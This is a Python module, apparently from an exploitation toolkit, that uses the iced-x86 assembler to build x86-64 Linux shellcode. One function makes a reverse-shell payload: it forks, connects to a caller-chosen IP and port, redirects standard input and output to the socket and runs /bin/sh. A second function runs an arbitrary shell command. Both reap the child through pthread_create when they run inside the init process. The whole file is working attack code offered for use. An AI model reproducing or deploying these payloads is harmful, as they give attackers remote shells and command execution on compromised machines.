from __future__ import annotations
from iced_x86 import (
    BlockEncoder,
    Code,
    Instruction as Instr,
    MemoryOperand,
    Register,
)
from ipaddress import IPv4Address
import logging
import struct
from typing import Optional, Tuple

from .shared import ShellcodeContext
from .util import u64_le

logger = logging.getLogger(__name__)

def add_label(id: int, instruction: Instr) -> Instr:
    """Helper function for iced-x86 instructions."""
    instruction.ip = id
    return instruction

# Thanks to Andriy Brukhovetskyy (doomedraven) for the reference.
# See: https://shell-storm.org/shellcode/files/shellcode-871.html
def create_shellcode_body_rshell(context: ShellcodeContext, endpoint: Tuple[IPv4Address, int]) -> Optional[Tuple[bytes, int]]:
    (ip, port) = endpoint

    shellcode = b''

    sockaddr_offset = len(shellcode)
    shellcode += struct.pack('<H', 0x2)
    shellcode += struct.pack('>H', port)
    shellcode += ip.packed
    shellcode += b'\x00' * 8
    assert(len(shellcode) == 0x10)

    bin_sh_offset = len(shellcode)
    shellcode += b'/bin/sh\0'

    env_var_path_offset = len(shellcode)
    shellcode += b"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\0"

    # Pad to 0x8-aligned offset.
    shellcode += b'\x00' * (8 - (len(shellcode) % 8))

    # Setup `argv`.
    argv_offset = len(shellcode)
    shellcode += u64_le(context.origin + bin_sh_offset)
    shellcode += b'\x00' * 8

    # Setup `envp`.
    envp_offset = len(shellcode)
    shellcode += u64_le(context.origin + env_var_path_offset)
    shellcode += b'\x00' * 8

    # `pthread_t`
    pthread_id_offset = len(shellcode)
    shellcode += b'\x00' * 8

    label_parent = 1
    label_dup2 = 2
    label_exit = 3
    label_wait4 = 4
    label_return = 5

    # Entry offset.
    entry = len(shellcode)

    # Address of `pthread_create`.
    pthread_create = context.addrs.pthread_create

    instrs = [
        # sys_fork
        Instr.create_reg_i64(Code.MOV_R64_IMM64, Register.RAX, 0x39),
        Instr.create(Code.SYSCALL),

        # Only continue if child process.
        Instr.create_reg_reg(Code.TEST_RM64_R64, Register.RAX, Register.RAX),
        Instr.create_branch(Code.JNE_REL32_64, label_parent),

        # sys_socket(AF_INET, SOCK_STREAM, 0)
        Instr.create_reg_i64(Code.MOV_R64_IMM64, Register.RAX, 0x29),
        Instr.create_reg_i64(Code.MOV_R64_IMM64, Register.RDI, 0x2),
        Instr.create_reg_i64(Code.MOV_R64_IMM64, Register.RSI, 0x1),
        Instr.create_reg_reg(Code.XOR_R64_RM64, Register.RDX, Register.RDX),
        Instr.create(Code.SYSCALL),

        # Preserve socket descriptor in RDI.
        Instr.create_reg_reg(Code.XCHG_R64_RAX, Register.RDI, Register.RAX),

        # sys_connect
        Instr.create_reg_i64(Code.MOV_R64_IMM64, Register.RAX, 0x2A),
        Instr.create_reg_mem(Code.LEA_R64_M, Register.RSI, MemoryOperand(Register.RIP, displ=(sockaddr_offset - entry))),
        Instr.create_reg_i64(Code.MOV_R64_IMM64, Register.RDX, 0x10),
        Instr.create(Code.SYSCALL),

        # Exit gracefully if sys_connect failed.
        Instr.create_reg_reg(Code.TEST_RM64_R64, Register.RAX, Register.RAX),
        Instr.create_branch(Code.JNE_REL32_64, label_exit),

        # sys_dup2 for stdio into socket fd.
        Instr.create_reg_i64(Code.MOV_R64_IMM64, Register.RSI, 3),
        add_label(label_dup2, Instr.create_reg(Code.DEC_RM64, Register.RSI)),
        Instr.create_reg_i64(Code.MOV_R64_IMM64, Register.RAX, 0x21),
        Instr.create(Code.SYSCALL),
        Instr.create_branch(Code.JNE_REL32_64, label_dup2),

        # TODO: Implement password for fun?

        # sys_execve
        Instr.create_reg_mem(Code.LEA_R64_M, Register.RDI, MemoryOperand(Register.RIP, displ=(bin_sh_offset - entry))),
        Instr.create_reg_mem(Code.LEA_R64_M, Register.RSI, MemoryOperand(Register.RIP, displ=(argv_offset - entry))),
        Instr.create_reg_mem(Code.LEA_R64_M, Register.RDX, MemoryOperand(Register.RIP, displ=(envp_offset - entry))),
        Instr.create_reg_i32(Code.MOV_R64_IMM64, Register.RAX, 0x3B),
        Instr.create(Code.SYSCALL),

        # sys_wait4
        # We already have the pid in RDI.
        add_label(label_wait4, Instr.create_reg_i32(Code.MOV_R64_IMM64, Register.RAX, 0x3D)),
        Instr.create_reg_reg(Code.XOR_RM64_R64, Register.RSI, Register.RSI),
        Instr.create_reg_reg(Code.XOR_RM64_R64, Register.RDX, Register.RDX),
        Instr.create_reg_reg(Code.XOR_RM64_R64, Register.RCX, Register.RCX),
        Instr.create(Code.SYSCALL),

        # sys_exit(0)
        add_label(label_exit, Instr.create_reg_i32(Code.MOV_R64_IMM64, Register.RAX, 0x3C)),
        Instr.create_reg_reg(Code.XOR_R64_RM64, Register.RDI, Register.RDI),
        Instr.create(Code.SYSCALL),

        # sys_getpid
        # Parent logic: Check if we are the init process, and if so spawn a thread to sys_wait4 on the child fork.
        # Preserve child process ID in RDI.
        add_label(label_parent, Instr.create_reg_reg(Code.MOV_RM64_R64, Register.RDI, Register.RAX)),
        Instr.create_reg_i32(Code.MOV_R64_IMM64, Register.RAX, 0x27),
        Instr.create(Code.SYSCALL),

        # If pid != 1 then we don't need to sys_wait4.
        Instr.create_reg_i32(Code.CMP_RAX_IMM32, Register.RAX, 1),
        Instr.create_branch(Code.JNE_REL32_64, label_return),

        # Call `pthread_create` to `sys_wait4` on the child process and avoid zombies.
        Instr.create_reg_i64(Code.MOV_R64_IMM64, Register.RAX, pthread_create),
        Instr.create_reg_reg(Code.MOV_RM64_R64, Register.RCX, Register.RDI), # RCX = child pid
        Instr.create_reg_mem(Code.LEA_R64_M, Register.RDI, MemoryOperand(Register.RIP, displ=(pthread_id_offset - entry))),
        Instr.create_reg_reg(Code.XOR_RM64_R64, Register.RSI, Register.RSI),
        Instr.create_reg_mem(Code.LEA_R64_M, Register.RDX, MemoryOperand(Register.RIP, displ=label_wait4)),
        Instr.create_reg(Code.CALL_RM64, Register.RAX),

        # NOP here because we are a branch target and iced-x86 won't let us RET.
        add_label(label_return, Instr.create(Code.NOPQ)),
    ]

    encoder = BlockEncoder(64)
    encoder.add_many(instrs)
    encoded_bytes = encoder.encode(0) + b'\xC3'

    shellcode += encoded_bytes

    return (shellcode, entry)

def create_shellcode_body_command(context: ShellcodeContext, command: bytes) -> Optional[Tuple[bytes, int]]:
    if b'\x00' in command:
        logger.error('Shell command cannot contain null bytes')
        return None
    if 0x800 < len(command):
        logger.error('Shell command is too large')
        return None

    shellcode = b''

    bin_sh_offset = len(shellcode)
    shellcode += b'/bin/sh\0'

    dash_c_offset = len(shellcode)
    shellcode += b'-c\0'

    command_offset = len(shellcode)
    shellcode += command + b'\x00'

    env_var_path_offset = len(shellcode)
    shellcode += b"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\0"

    # Pad to 0x8-aligned offset.
    shellcode += b'\x00' * (8 - (len(shellcode) % 8))

    # Setup `argv`.
    argv_offset = len(shellcode)
    shellcode += u64_le(context.origin + bin_sh_offset)
    shellcode += u64_le(context.origin + dash_c_offset)
    shellcode += u64_le(context.origin + command_offset)
    shellcode += b'\x00' * 8

    # Setup `envp`.
    envp_offset = len(shellcode)
    shellcode += u64_le(context.origin + env_var_path_offset)
    shellcode += b'\x00' * 8

    # `pthread_t`
    pthread_id_offset = len(shellcode)
    shellcode += b'\x00' * 8

    # Entry offset.
    entry = len(shellcode)

    # Address of `pthread_create`.
    pthread_create = context.addrs.pthread_create

    label_parent = 1
    label_return = 2
    label_wait4 = 3

    # These instructions aren't space effecient but we aren't very space constrained. :)
    instrs = [
        # sys_fork
        Instr.create_reg_i64(Code.MOV_R64_IMM64, Register.RAX, 0x39),
        Instr.create(Code.SYSCALL),

        # Only execve if child process.
        Instr.create_reg_reg(Code.TEST_RM64_R64, Register.RAX, Register.RAX),
        Instr.create_branch(Code.JNE_REL32_64, label_parent),

        # sys_execve
        # NOTE: iced-x86 displacement is relative to start of encoded block?
        Instr.create_reg_mem(Code.LEA_R64_M, Register.RDI, MemoryOperand(Register.RIP, displ=(bin_sh_offset - entry))),
        Instr.create_reg_mem(Code.LEA_R64_M, Register.RSI, MemoryOperand(Register.RIP, displ=(argv_offset - entry))),
        Instr.create_reg_mem(Code.LEA_R64_M, Register.RDX, MemoryOperand(Register.RIP, displ=(envp_offset - entry))),
        Instr.create_reg_i32(Code.MOV_R64_IMM64, Register.RAX, 0x3B),
        Instr.create(Code.SYSCALL),

        # sys_wait4
        # We already have the pid in RDI.
        add_label(label_wait4, Instr.create_reg_i32(Code.MOV_R64_IMM64, Register.RAX, 0x3D)),
        Instr.create_reg_reg(Code.XOR_RM64_R64, Register.RSI, Register.RSI),
        Instr.create_reg_reg(Code.XOR_RM64_R64, Register.RDX, Register.RDX),
        Instr.create_reg_reg(Code.XOR_RM64_R64, Register.RCX, Register.RCX),
        Instr.create(Code.SYSCALL),

        # sys_exit(0)
        Instr.create_reg_i32(Code.MOV_R64_IMM64, Register.RAX, 0x3C),
        Instr.create_reg_reg(Code.XOR_R64_RM64, Register.RDI, Register.RDI),
        Instr.create(Code.SYSCALL),

        # sys_getpid
        # Parent logic: Check if we are the init process, and if so spawn a thread to sys_wait4 on the child fork.
        # Preserve child process ID in RDI.
        add_label(label_parent, Instr.create_reg_reg(Code.MOV_RM64_R64, Register.RDI, Register.RAX)),
        Instr.create_reg_i32(Code.MOV_R64_IMM64, Register.RAX, 0x27),
        Instr.create(Code.SYSCALL),

        # If pid != 1 then we don't need to sys_wait4.
        Instr.create_reg_i32(Code.CMP_RAX_IMM32, Register.RAX, 1),
        Instr.create_branch(Code.JNE_REL32_64, label_return),

        # Call `pthread_create` to `sys_wait4` on the child process and avoid zombies.
        Instr.create_reg_i64(Code.MOV_R64_IMM64, Register.RAX, pthread_create),
        Instr.create_reg_reg(Code.MOV_RM64_R64, Register.RCX, Register.RDI), # RCX = child pid
        Instr.create_reg_mem(Code.LEA_R64_M, Register.RDI, MemoryOperand(Register.RIP, displ=(pthread_id_offset - entry))),
        Instr.create_reg_reg(Code.XOR_RM64_R64, Register.RSI, Register.RSI),
        Instr.create_reg_mem(Code.LEA_R64_M, Register.RDX, MemoryOperand(Register.RIP, displ=label_wait4)),
        Instr.create_reg(Code.CALL_RM64, Register.RAX),

        # NOP here because we are a branch target and iced-x86 won't let us RET.
        add_label(label_return, Instr.create(Code.NOPQ)),
    ]

    encoder = BlockEncoder(64)
    encoder.add_many(instrs)
    encoded_bytes = encoder.encode(0) + b'\xC3'

    shellcode += encoded_bytes

    return (shellcode, entry)
